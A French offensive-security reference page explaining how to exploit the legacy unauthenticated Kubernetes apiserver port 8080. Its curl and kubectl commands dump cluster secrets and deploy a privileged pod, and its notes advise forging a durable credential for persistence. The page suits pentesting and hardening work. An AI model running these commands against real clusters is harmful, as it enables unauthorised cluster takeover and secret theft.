---
title: "Port apiserver non sécurisé : l'ancien plan de contrôle non authentifié"
order: 5
description: "Les anciens API servers Kubernetes pouvaient servir un port non sécurisé, historiquement 8080, qui n'effectuait aucune authentification ni autorisation : chaque requête arrivait comme un appel de confiance. Là où un tel port est encore activé ou exposé, un attaquant qui l'atteint dispose du contrôle complet et non authentifié du cluster, lisant les secrets et créant des workloads à volonté."
keywords:
  - insecure port
  - 8080
  - api server
  - unauthenticated
  - localhost
---

# Port apiserver non sécurisé

Les anciens API servers Kubernetes proposaient un port de service non sécurisé, par défaut 8080, lié à localhost, qui n'appliquait aucune authentification ni autorisation : tout ce qui se connectait était traité comme pleinement autorisé. Il était destiné uniquement au bootstrap et à l'administration locale, mais les clusters qui l'activaient sur une interface accessible, ou l'exposaient via un proxy mal configuré ou un pod hostNetwork, livrent le contrôle complet à quiconque l'atteint. Les versions modernes ont supprimé ce drapeau, mais les clusters anciens et sur mesure l'exécutent encore.

Le sonder :

```bash
# plain HTTP, no credentials; a JSON version response means full access
curl -s http://<api>:8080/version
curl -s http://<api>:8080/api/v1/namespaces/kube-system/secrets | head
# from a hostNetwork pod, the localhost binding is reachable
curl -s http://127.0.0.1:8080/api/v1/nodes
```

## Contrôle complet sans aucun identifiant

```bash
# point kubectl at the insecure port
kubectl --server=http://<api>:8080 get secrets --all-namespaces
kubectl --server=http://<api>:8080 get nodes
# create a node-owning pod directly
kubectl --server=http://<api>:8080 apply -f privileged-pod.yaml
```

## Notes d'exploitation

- Le port non sécurisé est exempt d'autorisation : il n'y a aucun `can-i` à vérifier, chaque verbe sur chaque ressource réussit, c'est donc une compromission immédiate du cluster lorsqu'il est accessible.
- Il est généralement lié à localhost, de sorte que la portée réaliste part du nœud du plan de contrôle lui-même ou d'un pod `hostNetwork` planifié dessus ; voir [Espaces de noms de l'hôte](../pod-escape-to-node/host-namespaces.md).
- Lorsqu'il est présent, préférez lire les secrets et forger un identifiant durable ([Approbation de CSR](../rbac-privilege-escalation/csr-approval.md)) plutôt que de dépendre du port, qui peut être fermé par un correctif.

## Références

- [Kubernetes : ports de l'API server et bootstrapping](https://kubernetes.io/docs/concepts/security/controlling-access/)
- [kube-hunter : API server non sécurisé](https://aquasecurity.github.io/kube-hunter/)
